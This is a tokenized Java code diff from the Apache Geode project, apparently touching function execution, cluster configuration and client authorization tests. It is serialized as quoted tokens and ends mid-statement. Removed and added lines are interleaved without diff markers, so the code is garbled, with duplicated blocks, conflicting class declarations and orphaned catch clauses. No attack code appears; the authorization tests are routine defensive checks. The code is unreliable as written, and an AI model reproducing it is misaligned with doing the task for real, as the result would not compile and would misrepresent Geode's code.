"getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "CliStrings", ".", "format", "(", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__ERROR_IN_EXECUTING_0_ON_MEMBER_1_ON_REGION_2_DETAILS_3", ",", "functionId", ",", "member", ".", "getId", "(", "),", "onRegion", ",", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__ERROR_IN_RETRIEVING_EXECUTOR", ")", "))", ";", "return", ";", "}", "if", "(", "functionArgs", "!", "=", "null", "&", "&", "functionArgs", ".", "length", ">", "0", ")", "{", "execution", "=", "execution", ".", "setArguments", "(", "functionArgs", ")", ";", "}", "if", "(", "filters", ".", "size", "(", ")", ">", "0", ")", "{", "execution", "=", "execution", ".", "withFilter", "(", "filters", ")", ";", "}", "if", "(", "resultCollectorInstance", "!", "=", "null", ")", "{", "execution", "=", "execution", ".", "withCollector", "(", "resultCollectorInstance", ")", ";", "}", "List", "<", "Object", ">", "results", "=", "(", "List", "<", "Object", ">", ")", "execution", ".", "execute", "(", "function", ".", "getId", "(", "))", ".", "getResult", "(", ");", "List", "<", "String", ">", "resultMessage", "=", "new", "ArrayList", "<", ">(", ");", "boolean", "functionSuccess", "=", "true", ";", "if", "(", "results", "!", "=", "null", ")", "{", "for", "(", "Object", "resultObj", ":", "results", ")", "{", "if", "(", "resultObj", "!", "=", "null", ")", "{", "if", "(", "resultObj", "instanceof", "Exception", ")", "{", "resultMessage", ".", "add", "(", "((", "Exception", ")", "resultObj", ")", ".", "getMessage", "(", "))", ";", "functionSuccess", "=", "false", ";", "}", "else", "{", "resultMessage", ".", "add", "(", "resultObj", ".", "toString", "(", "))", ";", "}", "if", "(", "functionArgs", "!", "=", "null", "&", "&", "functionArgs", ".", "length", ">", "0", ")", "{", "execution", "=", "execution", ".", "setArguments", "(", "functionArgs", ")", ";", "}", "if", "(", "filters", ".", "size", "(", ")", ">", "0", ")", "{", "execution", "=", "execution", ".", "withFilter", "(", "filters", ")", ";", "}", "List", "<", "Object", ">", "results", "=", "(", "List", "<", "Object", ">", ")", "execution", ".", "execute", "(", "function", ".", "getId", "(", "))", ".", "getResult", "(", ");", "List", "<", "String", ">", "resultMessage", "=", "new", "ArrayList", "<", ">(", ");", "boolean", "functionSuccess", "=", "true", ";", "if", "(", "results", "!", "=", "null", ")", "{", "for", "(", "Object", "resultObj", ":", "results", ")", "{", "if", "(", "resultObj", "!", "=", "null", ")", "{", "if", "(", "resultObj", "instanceof", "Exception", ")", "{", "resultMessage", ".", "add", "(", "((", "Exception", ")", "resultObj", ")", ".", "getMessage", "(", "))", ";", "functionSuccess", "=", "false", ";", "}", "else", "{", "resultMessage", ".", "add", "(", "resultObj", ".", "toString", "(", "))", ";", "}", "}", "}", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "functionSuccess", ",", "resultMessage", ".", "toString", "(", "))", ");", "}", "catch", "(", "ClassNotFoundException", "|", "IllegalAccessException", "|", "InstantiationException", "e", ")", "{", "context", ".", "getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "CliStrings", ".", "format", "(", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__RESULT_COLLECTOR_0_NOT_FOUND_ERROR_1", ",", "resultCollectorName", ",", "e", ".", "getMessage", "(", "))", "))", ";", "}", "catch", "(", "Exception", "e", ")", "{", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "\"", "Exception", ":", "\"", "+", "e", ".", "getMessage", "(", "))", ");", "}", "finally", "{", "securityService", ".", "logout", "(", ");", "}", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "functionSuccess", ",", "resultMessage", ".", "toString", "(", "))", ");", "}", "catch", "(", "Exception", "ex", ")", "{", "}", "catch", "(", "ClassNotFoundException", "|", "IllegalAccessException", "|", "InstantiationException", "e", ")", "{", "context", ".", "getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "CliStrings", ".", "format", "(", "CliStrings", ".", "EXECUTE_FUNCTION__MSG__RESULT_COLLECTOR_0_NOT_FOUND_ERROR_1", ",", "resultCollectorName", ",", "e", ".", "getMessage", "(", "))", "))", ";", "}", "catch", "(", "Exception", "e", ")", "{", "logger", ".", "error", "(", "\"", "error", "executing", "function", "\"", "+", "functionId", ",", "e", ")", ";", "context", ".", "getResultSender", "(", ")", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "ex", ".", "getMessage", "(", "))", ");", ".", "lastResult", "(", "new", "CliFunctionResult", "(", "member", ".", "getId", "(", "),", "false", ",", "\"", "Exception", ":", "\"", "+", "e", ".", "getMessage", "(", "))", ");", "}", "finally", "{", "if", "(", "loginSuccessful", ")", "{", "securityService", ".", "logout", "(", ");", "}", "}", "}", "@", "@", "-", "34", ",", "11", "+", "34", ",", "12", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "ClusterConfigurationService", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "InternalLocator", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "InternalEntity", ";", "import", "org", ".", "apache", ".", "geode", ".", "internal", ".", "logging", ".", "LogService", ";", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "configuration", ".", "messages", ".", "ConfigurationResponse", ";", "import", "org", ".", "apache", ".", "geode", ".", "security", ".", "ResourcePermission", ";", "public", "class", "GetClusterConfigurationFunction", "implements", "Function", "{", "public", "class", "GetClusterConfigurationFunction", "implements", "Function", ",", "InternalEntity", "{", "private", "static", "final", "Logger", "logger", "=", "LogService", ".", "getLogger", "(", ");", "@", "Override", "@", "@", "-", "145", ",", "16", "+", "145", ",", "16", "@", "@", "public", "Resource", "getResource", "(", ")", "{", "if", "(", "ALL", ".", "equals", "(", "resource", ")", ")", "{", "return", "Resource", ".", "ALL", ";", "}", "return", "Resource", ".", "valueOf", "(", "resource", ")", ";", "}", "/", "**", "*", "Returns", "the", "operation", ",", "could", "be", "either", "ALL", ",", "NULL", ",", "MANAGE", ",", "WRITE", "or", "READ", "*", "/", "public", "Operation", "getOperation", "(", ")", "{", "if", "(", "ALL", ".", "equals", "(", "operation", ")", ")", "if", "(", "ALL", ".", "equals", "(", "operation", ")", ")", "{", "return", "Operation", ".", "ALL", ";", "}", "return", "Operation", ".", "valueOf", "(", "operation", ")", ";", "}", "@", "@", "-", "49", ",", "6", "+", "49", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "DistributedMember", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "InternalDistributedSystem", ";", "import", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "internal", ".", "membership", ".", "InternalDistributedMember", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "IgnoredException", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "cache", ".", "internal", ".", "JUnit4CacheTestCase", ";", "/", "*", "@", "@", "-", "126", ",", "6", "+", "127", ",", "7", "@", "@", "public", "void", "defaultCollectorReturnsAllIntermediateResults", "(", ")", "{", "@", "Test", "(", ")", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionThrowsIllegalState", "(", ")", "{", "IgnoredException", ".", "addIgnoredException", "(", "\"", "java", ".", "lang", ".", "IllegalStateException", "\"", ");", "/", "/", "GEODE", "-", "1762", "-", "clients", "throw", "from", "execute", ",", "but", "peers", "throw", "from", "rc", ".", "getResult", "thrown", ".", "expect", "(", "FunctionException", ".", "class", ")", ";", "/", "/", "GEODE", "-", "1762", "-", "clients", "wrap", "cause", "in", "a", "ServerOperationException", "@", "@", "-", "163", ",", "7", "+", "165", ",", "7", "@", "@", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionReturnsIllegalStateExcep", "final", "Object", "result", "=", "rc", ".", "getResult", "(", ");", "}", "@", "Test", "(", ")", "@", "Test", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionReturnsFunctionException", "(", ")", "{", "/", "/", "GEODE", "-", "1762", "-", "clients", "throw", "from", "execute", ",", "but", "peers", "throw", "from", "rc", ".", "getResult", "thrown", ".", "expect", "(", "FunctionException", ".", "class", ")", ";", "@", "@", "-", "174", ",", "7", "+", "176", ",", "7", "@", "@", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionReturnsFunctionException", "final", "Object", "result", "=", "rc", ".", "getResult", "(", ");", "}", "@", "Test", "(", ")", "@", "Test", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionReturnsIllegalStateExceptionAsIntermediateResult", "(", ")", "{", "/", "/", "GEODE", "-", "1762", "-", "clients", "throw", "from", "execute", ",", "but", "peers", "throw", "from", "rc", ".", "getResult", "/", "/", "GEODE", "-", "1762", "-", "client", "throws", "a", "ServerOperationException", "@", "@", "-", "188", ",", "7", "+", "190", ",", "7", "@", "@", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionReturnsIllegalStateExcep", "final", "Object", "result", "=", "rc", ".", "getResult", "(", ");", "}", "@", "Test", "(", ")", "@", "Test", "public", "void", "defaultCollectorThrowsExceptionAfterFunctionReturnsFunctionExceptionAsIntermediateResult", "(", ")", "{", "/", "/", "GEODE", "-", "1762", "-", "clients", "throw", "from", "execute", ",", "but", "peers", "throw", "from", "rc", ".", "getResult", "thrown", ".", "expect", "(", "FunctionException", ".", "class", ")", ";", "@", "@", "-", "224", ",", "6", "+", "226", ",", "7", "@", "@", "public", "void", "defaultCollectorReturnsResultOfSendFunctionException", "(", ")", "{", "@", "Test", "public", "void", "customCollectorDoesNotSeeExceptionFunctionThrowsIllegalState", "(", ")", "{", "/", "/", "GEODE", "-", "1762", "-", "clients", "throw", "from", "execute", ",", "but", "peers", "throw", "from", "rc", ".", "getResult", "IgnoredException", ".", "addIgnoredException", "(", "\"", "java", ".", "lang", ".", "IllegalStateException", "\"", ");", "try", "{", "ResultCollector", "rc", "=", "getExecution", "(", ").", "withCollector", "(", "customCollector", ")", ".", "execute", "(", "(", "context", ")", "-", ">", "{", "throw", "new", "IllegalStateException", "(", ");", "@", "@", "-", "36", ",", "7", "+", "36", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "control", ".", "RebalanceOperation", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "control", ".", "RebalanceResults", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "control", ".", "ResourceManager", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionAdapter", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionInvocationTargetException", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "RegionFunctionContext", ";", "@", "@", "-", "56", ",", "7", "+", "56", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "Wait", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "WaitCriterion", ";", "public", "class", "TestFunction", "extends", "FunctionAdapter", "implements", "Declarable2", ",", "DataSerializable", "{", "public", "class", "TestFunction", "implements", "Function", ",", "Declarable2", ",", "DataSerializable", "{", "public", "static", "final", "String", "TEST_FUNCTION10", "=", "\"", "TestFunction10", "\"", ";", "public", "static", "final", "String", "TEST_FUNCTION9", "=", "\"", "TestFunction9", "\"", ";", "public", "static", "final", "String", "TEST_FUNCTION8", "=", "\"", "TestFunction8", "\"", ";", "@", "@", "-", "16", ",", "92", "+", "16", ",", "83", "@", "@", "import", "static", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ".", "onServer", ";", "import", "static", "org", ".", "apache", ".", "geode", ".", "distributed", ".", "ConfigurationProperties", ".", "SECURITY_MANAGER", ";", "import", "static", "org", ".", "apache", ".", "geode", ".", "security", ".", "SecurityTestUtil", ".", "assertNotAuthorized", ";", "import", "static", "org", ".", "apache", ".", "geode", ".", "security", ".", "SecurityTestUtil", ".", "createClientCache", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "assertThat", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "assertThatThrownBy", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Properties", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "ClassRule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "experimental", ".", "categories", ".", "Category", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "RegionShortcut", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "client", ".", "ClientCache", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "ResultCollector", ";", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "security", ".", "TestFunctions", ".", "ReadFunction", ";", "import", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "security", ".", "TestFunctions", ".", "WriteFunction", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "Host", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "VM", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "internal", ".", "JUnit4DistributedTestCase", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "rules", ".", "ClientVM", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "rules", ".", "ClusterStartupRule", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "dunit", ".", "rules", ".", "MemberVM", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "categories", ".", "DistributedTest", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "categories", ".", "SecurityTest", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "rules", ".", "ServerStarterRule", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "rules", ".", "VMProvider", ";", "@", "Category", "(", "{", "DistributedTest", ".", "class", ",", "SecurityTest", ".", "class", "}", ")", "public", "class", "ClientExecuteFunctionAuthDUnitTest", "extends", "JUnit4DistributedTestCase", "{", "final", "Host", "host", "=", "Host", ".", "getHost", "(", "0", ")", ";", "final", "VM", "client1", "=", "host", ".", "getVM", "(", "1", ")", ";", "final", "VM", "client2", "=", "host", ".", "getVM", "(", "2", ")", ";", "private", "Function", "writeFunction", ";", "private", "Function", "readFunction", ";", "@", "Rule", "public", "ServerStarterRule", "server", "=", "new", "ServerStarterRule", "(", ")", ".", "withProperty", "(", "SECURITY_MANAGER", ",", "SimpleTestSecurityManager", ".", "class", ".", "getName", "(", "))", ".", "withAutoStart", "(", ");", "@", "Before", "public", "void", "before", "(", ")", "{", "writeFunction", "=", "new", "WriteFunction", "(", ");", "readFunction", "=", "new", "ReadFunction", "(", ");", "FunctionService", ".", "registerFunction", "(", "writeFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "readFunction", ")", ";", "public", "class", "ClientExecuteFunctionAuthDUnitTest", "{", "private", "static", "Function", "writeFunction", ";", "private", "static", "Function", "readFunction", ";", "private", "static", "MemberVM", "server", ";", "private", "static", "ClientVM", "client1", ",", "client2", ";", "@", "ClassRule", "public", "static", "ClusterStartupRule", "cluster", "=", "new", "ClusterStartupRule", "(", ");", "@", "BeforeClass", "public", "static", "void", "beforeClass", "(", ")", "throws", "Exception", "{", "Properties", "properties", "=", "new", "Properties", "(", ");", "properties", ".", "setProperty", "(", "SECURITY_MANAGER", ",", "SimpleTestSecurityManager", ".", "class", ".", "getName", "(", "))", ";", "server", "=", "cluster", ".", "startServerVM", "(", "0", ",", "properties", ")", ";", "server", ".", "invoke", "(", "()", "-", ">", "{", "ClusterStartupRule", ".", "getCache", "(", ").", "createRegionFactory", "(", "RegionShortcut", ".", "REPLICATE", ")", ".", "create", "(", "\"", "region", "\"", ");", "}", ");", "client1", "=", "cluster", ".", "startClientVM", "(", "1", ",", "\"", "dataRead", "\"", ",", "\"", "dataRead", "\"", ",", "true", ",", "server", ".", "getPort", "(", "))", ";", "client2", "=", "cluster", ".", "startClientVM", "(", "2", ",", "\"", "dataWrite", "\"", ",", "\"", "dataWrite", "\"", ",", "true", ",", "server", ".", "getPort", "(", "))", ";", "VMProvider", ".", "invokeInEveryMember", "(", "()", "-", ">", "{", "writeFunction", "=", "new", "WriteFunction", "(", ");", "readFunction", "=", "new", "ReadFunction", "(", ");", "}", ",", "server", ",", "client1", ",", "client2", ")", ";", "}", "@", "Test", "public", "void", "testExecuteFunctionWithClientRegistration", "(", ")", "{", "client1", ".", "invoke", "(", "\"", "logging", "in", "with", "dataReader", "\"", ",", "(", ")", "-", ">", "{", "ClientCache", "cache", "=", "createClientCache", "(", "\"", "dataRead", "\"", ",", "\"", "dataRead", "\"", ",", "server", ".", "getPort", "(", "))", ";", "FunctionService", ".", "registerFunction", "(", "writeFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "readFunction", ")", ";", "public", "void", "testExecuteFunctionWithFunctionObject", "(", ")", "throws", "Exception", "{", "client1", ".", "invoke", "(", "()", "-", ">", "{", "ClientCache", "cache", "=", "ClusterStartupRule", ".", "getClientCache", "(", ");", "/", "/", "can", "not", "write", "assertNotAuthorized", "(", "()", "-", ">", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "writeFunction", ".", "getId", "(", "))", ",", "\"", "DATA", ":", "WRITE", "\"", ");", "assertThatThrownBy", "(", "()", "-", ">", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "writeFunction", ")", ")", ".", "hasMessageContaining", "(", "\"", "DATA", ":", "WRITE", "\"", ");", "/", "/", "can", "read", "ResultCollector", "rc", "=", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "readFunction", ".", "getId", "(", "))", ";", "ResultCollector", "rc", "=", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "readFunction", ")", ";", "assertThat", "(", "((", "ArrayList", ")", "rc", ".", "getResult", "(", "))", ".", "get", "(", "0", ")", ").", "isEqualTo", "(", "ReadFunction", ".", "SUCCESS_OUTPUT", ")", ";", "}", ");", "client2", ".", "invoke", "(", "\"", "logging", "in", "with", "dataWriter", "\"", ",", "(", ")", "-", ">", "{", "ClientCache", "cache", "=", "createClientCache", "(", "\"", "dataWrite", "\"", ",", "\"", "dataWrite", "\"", ",", "server", ".", "getPort", "(", "))", ";", "FunctionService", ".", "registerFunction", "(", "writeFunction", ")", ";", "FunctionService", ".", "registerFunction", "(", "readFunction", ")", ";", "client2", ".", "invoke", "(", "()", "-", ">", "{", "ClientCache", "cache", "=", "ClusterStartupRule", ".", "getClientCache", "(", ");", "/", "/", "can", "write", "ResultCollector", "rc", "=", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "writeFunction", ".", "getId", "(", "))", ";", "ResultCollector", "rc", "=", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "writeFunction", ")", ";", "assertThat", "(", "((", "ArrayList", ")", "rc", ".", "getResult", "(", "))", ".", "get", "(", "0", ")", ").", "isEqualTo", "(", "WriteFunction", ".", "SUCCESS_OUTPUT", ")", ";", "/", "/", "can", "not", "read", "assertNotAuthorized", "(", "()", "-", ">", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "readFunction", ".", "getId", "(", "))", ",", "\"", "DATA", ":", "READ", "\"", ");", "}", ");", "}", "@", "Test", "/", "/", "this", "would", "trigger", "the", "client", "to", "send", "a", "GetFunctionAttribute", "command", "before", "executing", "it", "public", "void", "testExecuteFunctionWithOutClientRegistration", "(", ")", "{", "client1", ".", "invoke", "(", "\"", "logging", "in", "with", "dataReader", "\"", ",", "(", ")", "-", ">", "{", "ClientCache", "cache", "=", "createClientCache", "(", "\"", "dataRead", "\"", ",", "\"", "dataRead", "\"", ",", "server", ".", "getPort", "(", "))", ";", "assertNotAuthorized", "(", "()", "-", ">", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "writeFunction", ".", "getId", "(", "))", ",", "\"", "DATA", ":", "WRITE", "\"", ");", "assertThatThrownBy", "(", "()", "-", ">", "onServer", "(", "cache", ".", "getDefaultPool", "(", "))", ".", "execute", "(", "readFunction", ")", ")", ".", "hasMessageContaining", "(", "\"", "DATA", ":", "READ", "\"", ");", "}", ");", "}", "}", "@", "@", "-", "243", ",", "7", "+", "243", ",", "8", "@", "@", "public", "CommandResultAssert", "tableHasColumnWithValuesContaining", "(", "String", "header", ",", "Arrays", ".", "stream", "(", "expectedValues", ")", ".", "anyMatch", "(", "actualValueString", ":", ":", "contains", ")", ";", "if", "(", "!", "actualValueContainsAnExpectedValue", ")", "{", "failWithMessage", "(", "\"", "Found", "unexpected", "value", ":", "\"", "+", "actualValue", ")", ";", "failWithMessage", "(", "\"", "Expecting", ":", "\"", "+", "Arrays", ".", "toString", "(", "expectedValues", ")", "+", "\"", ",", "but", "found", ":", "\"", "+", "actualValue", ")", ";", "}", "}", "@", "@", "-", "15", ",", "26", "+", "15", ",", "17", "@", "@", "package", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "test", ";", "import", "static", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "security", ".", "ResourcePermissions", ".", "CLUSTER_MANAGE", ";", "import", "static", "org", ".", "apache", ".", "geode", ".", "management", ".", "internal", ".", "security", ".", "ResourcePermissions", ".", "DATA_READ", ";", "import", "static", "org", ".", "assertj", ".", "core", ".", "api", ".", "Assertions", ".", "assertThat", ";", "import", "static", "org", ".", "mockito", ".", "ArgumentMatchers", ".", "any", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "java", ".", "util", ".", "function", ".", "Predicate", ";", "import", "org", ".", "assertj", ".", "core", ".", "api", ".", "Condition", ";", "import", "org", ".", "junit", ".", "BeforeClass", ";", "import", "org", ".", "junit", ".", "ClassRule", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "experimental", ".", "categories", ".", "Category", ";", "import", "org", ".", "mockito", ".", "Mockito", ";", "import", "org", ".", "mockito", ".", "invocation", ".", "InvocationOnMock", ";", "import", "org", ".", "mockito", ".", "stubbing", ".", "Answer", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "RegionShortcut", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "Function", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionContext", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "execute", ".", "FunctionService", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "internal", ".", "cli", ".", "functions", ".", "LuceneCreateIndexFunction", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "internal", ".", "cli", ".", "functions", ".", "LuceneDescribeIndexFunction", ";", "@", "@", "-", "45", ",", "11", "+", "36", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "internal", ".", "distributed", ".", "LuceneQueryFunction", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "internal", ".", "distributed", ".", "WaitUntilFlushedFunction", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "internal", ".", "results", ".", "LuceneGetPageFunction", ";", "import", "org", ".", "apache", ".", "geode", ".", "cache", ".", "lucene", ".", "internal", ".", "security", ".", "LucenePermission", ";", "import", "org", ".", "apache", ".", "geode", ".", "examples", ".", "SimpleSecurityManager", ";", "import", "org", ".", "apache", ".", "geode", ".", "security", ".", "ResourcePermission", ";", "import", "org", ".", "apache", ".", "geode", ".", "security", ".", "ResourcePermission", ".", "Operation", ";", "import", "org", ".", "apache", ".", "geode", ".", "security", ".", "ResourcePermission", ".", "Resource", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "categories", ".", "IntegrationTest", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "categories", ".", "SecurityTest", ";", "import", "org", ".", "apache", ".", "geode", ".", "test", ".", "junit", ".", "rules", ".", "ConnectionConfiguration", ";", "@", "@", "-", "58", ",", "413", "+", "45", ",", "87", "@", "@", "@", "Category", "(", "{", "IntegrationTest", ".", "class", ",", "SecurityTest", ".", "class", "}", ")", "public", "class", "LuceneFunctionSecurityTest", "{", "/", "/", "Note", ":", "this", "region", "name", "is", "embedded", "below", "in", "several", "@", "ConnectionConfiguration", "inputs", ",", "/", "/", "which", "is", "itself", "case", "-", "sensitive", "in", "parsing", ".", "private", "static", "String", "regionName", "=", "\"", "this_test_region", "\"", ";", "private", "static", "ResourcePermission", "CLUSTER_MANAGE_LUCENE", "=", "new", "ResourcePermission", "(", "Resource", ".", "CLUSTER", ",", "Operation", ".", "MANAGE", ",", "LucenePermission", ".", "TARGET", ")", ";", "private", "static", "ResourcePermission", "CLUSTER_READ_LUCENE", "=", "new", "ResourcePermission", "(", "Resource", ".", "CLUSTER", ",", "Operation", ".", "READ", ",", "LucenePermission", ".", "TARGET", ")", ";", "private", "static", "ResourcePermission", "DATA_READ_REGION", "=", "new", "ResourcePermission", "(", "Resource", ".", "DATA", ",", "Operation", ".", "READ", ",", "regionName", ")", ";", "private", "static", "Function", "luceneCreateIndexFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneCreateIndexFunction", "(", "))", ";", "private", "static", "Function", "luceneDescribeIndexFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneDescribeIndexFunction", "(", "))", ";", "private", "static", "Function", "luceneDestroyIndexFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneDestroyIndexFunction", "(", "))", ";", "private", "static", "Function", "luceneListIndexFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneListIndexFunction", "(", "))", ";", "private", "static", "Function", "luceneSearchIndexFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneSearchIndexFunction", "(", "))", ";", "private", "static", "Function", "dumpDirectoryFiles", "=", "Mockito", ".", "spy", "(", "new", "DumpDirectoryFiles", "(", "))", ";", "private", "static", "Function", "luceneQueryFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneQueryFunction", "(", "))", ";", "private", "static", "Function", "waitUntilFlushedFunction", "=", "Mockito", ".", "spy", "(", "new", "WaitUntilFlushedFunction", "(", "))", ";", "private", "static", "Function", "luceneGetPageFunction", "=", "Mockito", ".", "spy", "(", "new", "LuceneGetPageFunction", "(", "))", ";", "static", "{", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneCreateIndexFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneDescribeIndexFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneDestroyIndexFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneListIndexFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneSearchIndexFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "dumpDirectoryFiles", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneQueryFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "waitUntilFlushedFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "Mockito", ".", "doAnswer", "(", "callLastResult", "(", "))", ".", "when", "(", "luceneGetPageFunction", ")", ".", "execute", "(", "any", "(", "))", ";", "}", "/", "/", "The", "FunctionService", "requires", "a", "lastResult", "to", "be", "produced", "private", "static", "Answer", "<", "Void", ">", "callLastResult", "(", ")", "{", "return", "invocation", "-", ">", "{", "FunctionContext", "context", "=", "invocation", ".", "getArgument", "(", "0", ")", ";", "context", ".", "getResultSender", "(", ").", "lastResult", "(", "null", ")", ";", "return", "null", ";", "}", ";", "}", "private", "static", "final", "String", "RESULT_HEADER", "=", "\"", "Function", "Execution", "Result", "\"", ";", "@", "ClassRule", "public", "static", 